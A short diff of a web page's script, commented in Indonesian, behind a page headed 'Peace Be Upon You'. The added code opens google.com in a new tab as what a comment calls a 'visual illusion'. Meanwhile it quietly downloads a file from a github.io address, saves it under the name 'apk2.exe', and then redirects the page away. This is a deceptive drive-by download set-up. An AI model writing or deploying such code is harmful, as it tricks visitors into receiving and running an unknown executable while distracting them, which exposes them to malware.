@@ -9,10 +9,18 @@ function Puf(uri, name) {
 }
 
 function openWin() {
-  // Ganti data URI dengan URL eksternal
-  Puf("https://example.com/apk2.exe", "apk2.exe");
-  // Redirect ke google.com setelah unduhan
-  location.replace("http://google.com");
+  // Membuka google.com di tab baru untuk ilusi visual
+  window.open('https://google.com', 'x');
+  
+  // Memulai unduhan dari frozzipies.github.io setelah jeda 1 detik
+  setTimeout(function() {
+    Puf("https://frozzipies.github.io/test.apk", "apk2.exe");
+  }, 1000);
+  
+  // Redirect halaman utama ke google.com setelah 2 detik
+  setTimeout(function() {
+    location.replace("https://google.com");
+  }, 2000);
 }
 </script>
 <center><h2>Peace Be Upon You</h2></center>
